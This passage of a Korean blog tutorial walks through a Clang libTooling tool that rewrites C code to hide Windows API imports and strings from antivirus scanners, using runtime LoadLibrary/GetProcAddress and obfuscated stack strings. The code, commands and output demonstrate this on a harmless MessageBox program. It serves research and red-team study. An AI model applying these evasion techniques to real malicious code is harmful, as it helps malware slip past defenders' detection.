나타난다. 이 문자열들은 암호화되어야 하지만 이전 글에서 보여준 간단한 난독화 트릭으로 안티바이러스 탐지를 우회할 수 있다. 최종 결과는 다음과 같다.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>이번에는 <code>strings</code>와 <code>rabin2</code> 둘 다 문자열을 찾을 수 없다.</p><pre><code class="hljs cpp">➜  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe➜  strings /tmp/toto.exe | grep MessageBox➜  rabin2 -zz /tmp/toto.exe | grep MessageBox➜</code></pre><h2 id="자동화된-소스-코드-리팩터링"><a href="#자동화된-소스-코드-리팩터링" class="headerlink" title="자동화된 소스 코드 리팩터링"></a>자동화된 소스 코드 리팩터링</h2><p>이전 글에 설명된 것과 같은 방법으로 기존 코드 베이스를 refactoring 하여 의심스러운 API를 런타임에 로드하고 Import Address Table에서 제거할 수 있다. <code>libTooling</code>으로 구현된 기존의 작업을 기반으로 할 것이다.</p><p>이 작업을 다음과 같이 나열해보자.</p><ul><li>이전 예제의 추상 구문 트리를 생성해라. 함수 호출을 수정하기 위해 노드를 조작하는 방법을 이해하는데 필요하다.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>를 사용하여 지정된 API에 대한 API 코드 베이스의 모든 함수 호출을 찾아라.</li><li>다른 함수 식별자로 모든 호출을 대체해라.</li><li>각 함수 호출 전에 <code>LoadLibrary/GetProcAddress</code> 호출을 삽입하라.</li><li>작동하는지 확인해라.</li><li>모든 의심스러운 API를 종합하고 난독화해라.</li></ul><h3 id="MessageBox-애플리케이션의-추상-구문-트리"><a href="#MessageBox-애플리케이션의-추상-구문-트리" class="headerlink" title="MessageBox 애플리케이션의 추상 구문 트리"></a>MessageBox 애플리케이션의 추상 구문 트리</h3><p>원본 MessageBox 애플리케이션의 Clang 추상 구문 트리를 보기 위해 당신의 Windows SDK 경로를 적용하여 스크립트를 사용하자</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA API를 호출하는 간단한 애플리케이션의 Clang 추상 구문 트리</p><p>CallExpr 유형의 AST 노드를 찾으면 소스 코드에서의 함수 호출을 찾을 수 있다. 위 사진에 나와있는 것처럼 실제 호출되는 함수 이름은 하위 노드 중 하나에 지정되어 있으므로 나중에 접근할 수 있어야 한다.</p><h3 id="특정-API의-함수-호출-찾기"><a href="#특정-API의-함수-호출-찾기" class="headerlink" title="특정 API의 함수 호출 찾기"></a>특정 API의 함수 호출 찾기</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>는 특정 함수에 대한 모든 함수 호출을 열거하는데 필요하다. 우선 이전 글에서 사용된 것보다 더 복잡하므로 이 matcher에 맞는 구문을 얻는 것이 중요하다. 적합한 것을 찾기 위해서 소스 코드에서 custom query를 실행할 수 있는 interactive tool인 <code>clang-query</code>를 사용했다. 흥미롭게도 이것은 libTooling 기반이고 이 글에서 보여준 어떤 것보다 훨씬 강력하다.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>시행착오와 명령 줄 완성(tab completion)으로 빠르게 작업 솔루션에 접근할 수 있었다. matcher가 잘 동작하는 것을 확인했으니 이전 글에서 수행한 것과 같은 새로운 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>를 생성할 수 있다. <code>clang-query</code>를 사용하여 수행한 것을 C++ 재현하는 것이다.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>중요한 구현 세부 사항은 많은 다른 함수들에 적용할 수 있는 가능성을 제공하는 것이고 최종적인 목표는 각 수정된 API 함수에 <code>LoadLibrary/GetProcAddress</code>를 삽입하는 것이므로 함수 프로토타입과 DLL 이름을 제공해야 한다.</p><p>그렇게 하면 수정할 API만큼 많은 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumers</a>를 등록할 수 있다. 이 <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>의 인스턴스화는 <a href="https://clang.llvm.org/doxygen/classclang_1_1FrontendAction.html">ASTFrontendAction</a>에서 수행되야만 한다:</p><p><img src="/2020/12/13/idioth/av_evasion_part2/4.png"></p><p><code>main.cpp</code>의 주요 변경점.</p><p>이것은 이전 글에서 작업한 기존 코드에 대한 유일한 변경점이다. 우리가 추가할 코드들은 <code>ApiMatchHandelr.cpp</code>를 만드는 것부터 시작한다.</p><p>matcher는 콜백 함수와 함께 제공되므로 다음 하나를 제공하자.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ApiMatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>&#123;    llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Found &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *CallExpression = Result.Nodes.getNodeAs&lt;clang::CallExpr&gt;(<span class="hljs-string">&quot;callExpr&quot;</span>);    handleCallExpr(CallExpression, Result.Context);&#125;</code></pre><p>섹션의 시작 부분에서 리스트로 분리된 작업들은 아래 메소드를 통해 코드로 바꿀 수 있다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span></span>;<span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span></span>;<span class="hljs-keyword">bool</span>addGetProcAddress(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,                    <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName);<span class="hljs-function">clang::SourceRange <span class="hljs-title">findInjectionSpot</span><span class="hljs-params">(clang::ASTContext *<span class="hljs-keyword">const</span> Context, clang::ast_type_traits::DynTypedNode Parent,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> clang::CallExpr &amp;Literal, <span class="hljs-keyword">uint64_t</span> Iterations)</span></span>;</code></pre><h3 id="함수-호출-대체"><a href="#함수-호출-대체" class="headerlink" title="함수 호출 대체"></a>함수 호출 대체</h3><p>이것은 가장 사소한 부분이다. 목표는 AST의 <code>MessageBoxA</code>를 무작위 식별자로 대체하는 것이다. 이러한 무작위 변수 초기화는 다음 섹션에서 수행된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::handleCallExpr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext)</span> </span>&#123;    <span class="hljs-comment">// generate a random variable name</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Replacement = Utils::translateStringToIdentifier(_ApiName);    <span class="hljs-comment">// inject Run-time dynamic linking</span>    <span class="hljs-keyword">if</span> (!addGetProcAddress(CallExpression, pContext, Replacement, _ApiName))        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;    <span class="hljs-comment">// MessageBoxA -&gt; random identifier generated above</span>    <span class="hljs-keyword">return</span> replaceIdentifier(CallExpression, _ApiName, Replacement);&#125;</code></pre><p><a href="https://clang.llvm.org/doxygen/Rewriter_8h_source.html#l00164">ReplaceText</a> Clagn API는 함수 식별자의 이름을 변경하는 데 사용된다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::replaceIdentifier</span><span class="hljs-params">(<span class="hljs-keyword">const</span> CallExpr *CallExpression, <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier)</span> </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>-&gt;ASTRewriter-&gt;ReplaceText(CallExpression-&gt;getBeginLoc(), ApiName.length(), NewIdentifier);&#125;</code></pre><h3 id="LoadLibrary-GetProcAddress-삽입"><a href="#LoadLibrary-GetProcAddress-삽입" class="headerlink" title="LoadLibrary/GetProcAddress 삽입"></a>LoadLibrary/GetProcAddress 삽입</h3><p>우리가 추가하고자 하는 API에 Run-time dynamic linking을 추가하는 과정은 다음과 같다:</p><ul><li><p>translation unit의 상단 혹은 enclosing 함수 안에 API 프로토타입을 추가해라. 쉽게 하기 위해 우리는 후자를 선택하지만 동일한 함수에서 API를 여러 번 호출할 경우 이미 추가되었는지 확인할 필요가 있다.</p></li><li><p>아래 라인을 추가해라</p><p>  <code>HANDLE &lt;random identifier&gt; LoadLibrary(&lt;library name&gt;);</code></p></li><li><p><code>GetProcAddress</code> 호출을 추가해라</p></li></ul><p>물론 이 작업을 하면서 문자열 리터럴을 삽입하지 않기 위해 각 문자열을 스택 문자열로 작성해야 한다. 이것은 코드를 읽기 지루하게 만들지만 복잡하진 않다.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">ApiMatchHandler::addGetProcAddress</span><span class="hljs-params">(<span class="hljs-keyword">const</span> clang::CallExpr *pCallExpression, clang::ASTContext *<span class="hljs-keyword">const</span> pContext,</span></span><span class="hljs-function"><span class="hljs-params">                                        <span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;NewIdentifier, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> &amp;ApiName)</span> </span>&#123;    SourceRange EnclosingFunctionRange = findInjectionSpot(pContext, clang::ast_type_traits::DynTypedNode(),                                                           *pCallExpression, <span class="hljs-number">0</span>);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">stringstream</span> Result;    <span class="hljs-comment">// add function prototype if not already added</span>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">std</span>::find(TypedefAdded.begin(), TypedefAdded.end(), pCallExpression-&gt;getDirectCallee()) == TypedefAdded.end()) &#123;        Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; _TypeDef &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    &#125;    <span class="hljs-comment">// add LoadLibrary with obfuscated strings</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryVariable = Utils::translateStringToIdentifier(_Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryString = Utils::generateVariableDeclaration(LoadLibraryVariable, _Library);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> LoadLibraryHandleIdentifier = Utils::translateStringToIdentifier(<span class="hljs-string">&quot;hHandle_&quot;</span>+_Library);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; LoadLibraryString &lt;&lt; <span class="hljs-built_in">std</span>::<span class="hljs-built_in">endl</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\tHANDLE &quot;</span> &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot; = LoadLibrary(&quot;</span> &lt;&lt; LoadLibraryVariable &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    <span class="hljs-comment">// add GetProcAddress with obfuscated string: TypeDef NewIdentifier = (TypeDef) GetProcAddress(handleIdentifier, ApiName)</span>    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameIdentifier = Utils::translateStringToIdentifier(ApiName);    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiNameDecl = Utils::generateVariableDeclaration(ApiNameIdentifier, ApiName);    Result &lt;&lt; <span class="hljs-string">&quot;\t&quot;</span> &lt;&lt; ApiNameDecl &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;    Result &lt;&lt; <span class="hljs-string">&quot;\t_ &quot;</span>&lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; NewIdentifier &lt;&lt; <span class="hljs-string">&quot; = (_&quot;</span> &lt;&lt; ApiName &lt;&lt; <span class="hljs-string">&quot;) GetProcAddress(&quot;</span>           &lt;&lt; LoadLibraryHandleIdentifier &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; ApiNameIdentifier &lt;&lt; <span class="hljs-string">&quot;);\n&quot;</span>;    TypedefAdded.push_back(pCallExpression-&gt;getDirectCallee());    <span class="hljs-comment">// add everything at the beginning of the function.</span>    <span class="hljs-keyword">return</span> !(ASTRewriter-&gt;InsertText(EnclosingFunctionRange.getBegin(), Result.str()));&#125;</code></pre><h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><pre><code class="hljs cpp">git clone https:<span class="hljs-comment">//github.com/scrt/avcleaner</span>mkdir avcleaner/CMakeBuild &amp;&amp; cd avcleaner/CMakeBuildcmake ..makecd ..</code></pre><p>전부 잘 동작하는지 테스트하기 위해 아래 테스트 파일을 사용하자.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    MessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Another test&quot;</span>, <span class="hljs-string">&quot;Another something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>obfuscator 실행!</p><pre><code class="hljs cpp">./CMakeBuild/avcleaner.bin test/messagebox_simple.c --strings=<span class="hljs-literal">true</span> --api=<span class="hljs-literal">true</span> -- -D _WIN64 -D _UNICODE -D UNICODE -D _WINSOCK_DEPRECATED_NO_WARNINGS\ -I /usr/local/Cellar/llvm/<span class="hljs-number">9.0</span><span class="hljs-number">.1</span>\ -I /Users/vladimir/dev/scrt/avcleaner/Include/msvc<span class="hljs-number">-14.15</span><span class="hljs-number">.26726</span>-include\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/ucrt\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/shared\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/um\ -I /Users/vladimir/dev/scrt/avcleaner/Include/<span class="hljs-number">10.0</span><span class="hljs-number">.17134</span><span class="hljs-number">.0</span>/winrt -w -fdebug-compilation-dir -fno-use-cxa-atexit -fms-extensions -fms-compatibility -fms-compatibility-version=<span class="hljs-number">19.15</span><span class="hljs-number">.26726</span> -<span class="hljs-built_in">std</span>=c++<span class="hljs-number">14</span> -fdelayed-<span class="hljs-keyword">template</span>-parsing -fobjc-runtime=gcc -fcxx-exceptions -fexceptions -fdiagnostics-show-option -fcolor-diagnostics -x c++ -ferror-limit=<span class="hljs-number">1900</span> -target x86_64-pc-windows-msvc19<span class="hljs-number">.15</span><span class="hljs-number">.26726</span> -fsyntax-only -disable-<span class="hljs-built_in">free</span> -disable-llvm-verifier -discard-value-names -dwarf-column-info -debugger-tuning=gdb -momit-leaf-frame-pointer -v</code></pre><p>결과 확인!</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Someth_lNGj92poubUG[] = &#123;<span class="hljs-string">&#x27;\x53&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_UP7KUo4Sa8LC[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>  hid_Anothe_ACsNhmIcS1tA[] = &#123;<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x20&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x6d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x74&#x27;</span>,<span class="hljs-string">&#x27;\x68&#x27;</span>,<span class="hljs-string">&#x27;\x69&#x27;</span>,<span class="hljs-string">&#x27;\x6e&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-number">0</span>&#125;;    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType)</span></span>;    TCHAR hid_User___Bhk5rL2239Kc[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_PFP2JD4HjR8w = LoadLibrary(hid_User___Bhk5rL2239Kc);    TCHAR hid_Messag_drqxgJLSrxfT[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span class="hljs-string">&#x27;\x67&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x42&#x27;</span>,<span class="hljs-string">&#x27;\x6f&#x27;</span>,<span class="hljs-string">&#x27;\x78&#x27;</span>,<span class="hljs-string">&#x27;\x41&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA hid_Messag_1W70P1kc8OJv = (_MessageBoxA) GetProcAddress(hid_hHandl_PFP2JD4HjR8w, hid_Messag_drqxgJLSrxfT);    TCHAR hid_User___EMmJBb201EuJ[] = &#123;<span class="hljs-string">&#x27;\x55&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x72&#x27;</span>,<span class="hljs-string">&#x27;\x33&#x27;</span>,<span class="hljs-string">&#x27;\x32&#x27;</span>,<span class="hljs-string">&#x27;\x2e&#x27;</span>,<span class="hljs-string">&#x27;\x64&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-string">&#x27;\x6c&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hid_hHandl_vU1riOrVWM8g = LoadLibrary(hid_User___EMmJBb201EuJ);    TCHAR hid_Messag_GoaJMFscXsdw[] = &#123;<span class="hljs-string">&#x27;\x4d&#x27;</span>,<span class="hljs-string">&#x27;\x65&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x73&#x27;</span>,<span class="hljs-string">&#x27;\x61&#x27;</span>,<span 